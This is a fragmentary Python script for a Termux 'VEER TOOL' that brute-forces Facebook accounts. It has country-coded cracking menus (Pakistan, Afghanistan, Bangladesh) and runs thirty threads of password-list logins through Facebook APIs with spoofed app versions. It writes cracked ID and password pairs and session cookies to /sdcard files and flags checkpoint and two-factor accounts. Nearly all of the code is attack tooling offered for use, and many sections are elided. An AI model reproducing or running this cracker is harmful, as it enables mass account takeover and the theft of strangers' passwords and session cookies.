...
print('\033[0;97m[•] \033[0;92mVEER TOOL IS TRACKING YOUR IP ADDRESS')
time.sleep(2)
...
\033[1;31m\033[1;37m➣ Version\x1b[1;97m     : \033[1;37m      0.2
\033[1;31m\033[1;37m➣ YouTube\x1b[1;97m.    : \033[1;37m     LaLa_Typist007
\033[1;37m------------------------\033[1;37m------------------------ """)
...
while key == 'true':
    ...
    if username == CorrectUsername:
            print('\033[1;97m====================================================\n\033[0;97m[•]\033[1;32m LOGGED IN VEER TOOL SUCCESSFULLY') 
            time.sleep(1)
            clear()
            key = 'false'
...
def menu():
        try:
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                clear()
                                print('\t\x1b[1;92m        VEER TOOL FILE CLONER')
                                linex()
                                ...
                                try:
                                        ...
                                        menu()
                                clear()
                                print('\t\x1b[1;92m        VEER TOOL METHODS MENU')
                                linex()
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print('\t\x1b[1;92m   VEER TOOL FILE CRACKING MENU')
                                        linex()
                                        ...
                                        print('\033[0;97m[•]\x1b[1;92m VEER TOOL CRACKING HAS BEEN STARTED')
                                        linex()
                                ...
                                print('\033[0;97m[•]\033[1;32m COOKIES SAVED IN \033[1;31m: \033[1;32m/sdcard/VEER-COOKIE.txt') 
                                print('\033[0;97m[•]\033[1;32m OK ACCOUNTS SAVED IN \033[1;31m: \033[1;32m/sdcard/VEER-OK.txt')
                                linex()
                                ...
                                os.system('xdg-open https://www.facebook.com/mradi5000');print('\x1b[1;97m[•] \x1b[1;92mPROGRAM CLOSED THANKS FOR USE VEER TOOL');time.sleep(2);linex();exit() 
                        else:
                                print('\033[0;97m[•] \033[0;91mCHOOSE CORRECT OPTION');menu()
        except ValueError:
                exit()
...
def pak():
                ...
                with tred(max_workers=30) as VEER:     
                        clear()
                        tl = str(len(user))
                        print('\t\x1b[1;92m   VEER TOOL RANDOM PAK CRACKING MENU')
                        linex()
...
def afg():
                ...
                with tred(max_workers=30) as VEER:     
                        clear()
                        tl = str(len(user))
                        print('\t\x1b[1;92m   VEER TOOL RANDOM AFG CRACKING MENU')
                        linex()
                        print('\033[0;97m[•] \x1b[1;92mTOTAL ACCOUNTS \x1b[1;91m: \033[1;36m'+tl)
                        print(f'\033[0;97m[•]\033[1;32m CHOICE CODE    \x1b[1;91m:\033[1;36m '+code)
                        print("\033[0;97m[•] \x1b[1;92mCLONING STARTED\033[1;91m: \033[1;96mTIME \033[1;97m[\033[1;96m"+str(a)+"\033[1;91m:\033[1;96m"+str(lt()[4])+" "+ tag+"\x1b[1;97m]")
...
def bd():
                ...
                with tred(max_workers=30) as VEER:     
                        clear()
                        tl = str(len(user))
                        print('      \x1b[1;92mVEER TOOL RANDOM BANGLADESH CRACKING MENU')
                        linex()
                        print('\033[0;97m[•] \x1b[1;92mTOTAL ACCOUNTS \x1b[1;91m: \033[1;36m'+tl)
                        print(f'\033[0;97m[•]\033[1;32m CHOICE CODE    \x1b[1;91m:\033[1;36m '+code)
                        print("\033[0;97m[•] \x1b[1;92mCLONING STARTED\033[1;91m: \033[1;96mTIME \033[1;97m[\033[1;96m"+str(a)+"\033[1;91m:\033[1;96m"+str(lt()[4])+" "+ tag+"\x1b[1;97m]")
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m[VEER-M1] \x1b[1;97m[\x1b[1;93m%s\x1b[1;97m] \033[1;37m[\x1b[1;92mOK ACCOUNTS\x1b[1;91m:\x1b[1;92m %s\x1b[1;97m] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
...
def api(ids,names,passlist):
                try:
                        ...
                        sys.stdout.write('\r\r\033[1;37m[VEER-M2]   [%s] \033[1;37m[\x1b[1;92mOK ACCOUNTS\x1b[1;91m:\x1b[1;92m %s\x1b[1;97m] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                    ...
                    'user-agent': ua}
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\033[1;92m[VEER-OK]  '+ids+'  | '+pas+ ' '+joined(ids)+' ')
                                        open('/sdcard/VEER-OK.txt','a').write(ids+'|'+pas+'\n')
                                        open('/sdcard/VEER-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+'\n')
                                        oks.append(ids)
                                elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r\033[1;96m[VEER-2F]  '+ids+' | '+pas)
                                                twf.append(ids)
                                                break                   
                                elif 'www.facebook.com' in q['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;92m[VEER-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/VEER-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
...
def api1(ids,names,passlist):
                try:
                        global ok,loop,proxies
                        sys.stdout.write('\r\r\033[1;37m[VEER-M3] [%s] \033[1;37m[\x1b[1;92mOK ACCOUNTS\x1b[1;91m:\x1b[1;92m %s\x1b[1;97m] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                    ...
                    'user-agent': ua}
                                ...
                                if 'session_key' in q:
                                        coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                                        print('\r\r\x1b[1;92m[\033[0;97mVEER-OK\033[0;92m]\033[1;92m '+ids+' \033[1;37m|\033[1;32m '+pas+ ' '+joined(ids)+' ')
                                        open('/sdcard/VEER-OK.txt','a').write(ids+'|'+pas+'\n')
                                        open('/sdcard/VEER-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+'\n')
                                        oks.append(ids)
                                elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;96m[VEER-OK] '+ids+' | '+pas+ ' '+joined(ids)+' ')
                                                twf.append(ids)
                                                break           
                                elif 'www.facebook.com' in q['error_msg']:
                                        if 'y' in pcp:
...
def rndm(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m[\x1b[38;5;208mVEER-CRACKING\x1b[1;97m] \x1b[1;97m[\x1b[1;93m%s\x1b[1;97m] \033[1;37m[\x1b[1;92mOK ACCOUNTS\x1b[1;91m:\x1b[1;92m %s\x1b[1;97m] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                ...
                                if 'session_key' in q:
                                        ...
                                        try:
                                                ...
                                                if uid in okk:pass
                                                        ...
                                                        coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                                                        print('\r\r\x1b[1;92m[\033[0;97mVEER-OK\033[0;92m]\033[1;92m '+uid+' \033[1;37m|\033[1;32m '+pas+ ' '+joined(uid)+' ')      
                                                        #print("Cookie: "+coki)
                                                        open('/sdcard/VEER-rndm-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        open('/sdcard/VEER-rndm-COOKIE.txt', 'a').write(uid+'|'+pas+'|'+coki+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\x1b[1;92m[VEER-OK] '+uid+' | '+pas+'\033[1;97m')
